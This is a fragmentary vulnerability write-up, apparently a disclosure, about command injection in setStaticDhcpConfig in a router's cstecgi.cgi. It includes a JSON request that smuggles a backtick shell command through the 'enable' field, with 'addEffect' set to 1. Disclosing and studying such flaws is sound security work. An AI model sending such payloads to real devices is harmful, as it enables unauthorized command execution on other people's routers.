...
The vulnerability is located in the function `sub_411AB8` within `cstecgi.cgi`, also known as `setStaticDhcpConfig`.

![](Pasted%20image%2020231128164406.png)

We make `addEffect` to be `1` to enter the first `if`.
...
therefore , by controlling parameter `addEffect` and `enable` , we can finally make an arbitrary command execution
...
{"enable":"`id > /1.txt;`","addEffect":"1","topicurl":"setStaticDhcpConfig","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231128164938.png)